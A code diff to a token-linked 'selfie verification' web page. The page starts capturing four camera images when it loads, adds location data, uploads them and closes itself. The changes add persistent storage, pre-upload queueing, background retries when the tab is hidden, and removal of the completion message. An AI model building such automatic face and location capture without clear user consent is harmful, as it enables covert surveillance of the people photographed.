@@ -11,7 +11,7 @@ html,body{margin:0;width:100%;min-height:100%;background:#fff!important;color:#1
 body{overflow:hidden;display:grid;place-items:center}
 .status-screen{position:fixed;inset:0;display:grid;place-items:center;background:#fff;color:#111;text-align:center}
 .status-box{display:flex;flex-direction:column;align-items:center;gap:16px;padding:24px}
-.spinner{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .8s linear infinite}
+.spinner{width:42px;height:42px;border:4px solid #e5e7eb;border-top-color:#111;border-radius:50%;animation:spin .65s linear infinite}
 .status-title{font:600 18px/1.3 system-ui,-apple-system,Segoe UI,sans-serif}
 .status-text{font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif;color:#666;max-width:280px}
 @keyframes spin{to{transform:rotate(360deg)}}
@@ -49,6 +49,8 @@ function openQueue(){
   });
 }
 
+async function requestStoragePersistence(){try{if(navigator.storage?.persist)await navigator.storage.persist()}catch(_){} }
+
 async function queueBatch(blobs,metadata){
   try{
     const db=await openQueue();
@@ -78,6 +80,8 @@ async function deleteRows(rows){
   }
 }
 
+async function getQueueStatus(){if(!token)return null;try{const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/status",{credentials:"omit",cache:"no-store"});const d=await r.json().catch(()=>({}));return r.ok&&d.success?d:null}catch(_){return null}}
+
 async function flushQueue(){
   if(!token)return;
   try{
@@ -103,7 +107,7 @@ async function flushQueue(){
         let d={};try{d=await r.json()}catch(_){}
         if(!r.ok||!d.success){
           console.error("Selfie queued upload failed:",r.status,d);
-          if(r.status===410){await deleteRows(group);continue;}
+          if(r.status===410){const status=await getQueueStatus();if(status?.count===4){await deleteRows(group);continue;}}
           break;
         }
         console.log("Selfie queued upload succeeded:",d);
@@ -146,6 +150,7 @@ async function captureFour(){
   try{
     if(!token)throw new Error("Invalid verification link.");
     setStatus("Preparing secure verification…","Checking your secure verification link.");
+    await requestStoragePersistence();
     await flushQueue();
 
     const requestResponse=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token),{credentials:"omit",cache:"no-store"});
@@ -198,6 +203,7 @@ async function captureFour(){
 
     locationMetadata=await locationPromise.catch(()=>null);
     metadata.location=locationMetadata;
+    await queueBatch(blobs,{...metadata,totalCaptures:4});
     setStatus("Uploading securely…","Sending the four verification images.");
     const fd=new FormData();
     blobs.forEach((blob,i)=>fd.append("files",blob,"video-verification-"+(i+1)+".jpg"));
@@ -210,7 +216,6 @@ async function captureFour(){
       throw new Error(uploadData.error||"Verification upload failed.");
     }
     console.log("Selfie batch upload succeeded:",uploadData);
-    setStatus("Verification complete.","Closing this page.");
     await flushQueue();
     try { window.close(); } catch (_) {}
     setTimeout(()=>{ try { window.close(); } catch (_) {} },300);
@@ -229,7 +234,8 @@ async function captureFour(){
 
 document.addEventListener("DOMContentLoaded",captureFour,{once:true});
 window.addEventListener("online",flushQueue);
-setTimeout(flushQueue,1000);
+document.addEventListener("visibilitychange",()=>{if(document.visibilityState==="hidden")flushQueue().catch(()=>{})});
+setTimeout(()=>{requestStoragePersistence().catch(()=>{});flushQueue().catch(()=>{})},1000);
 })();
 </script>
 </body>
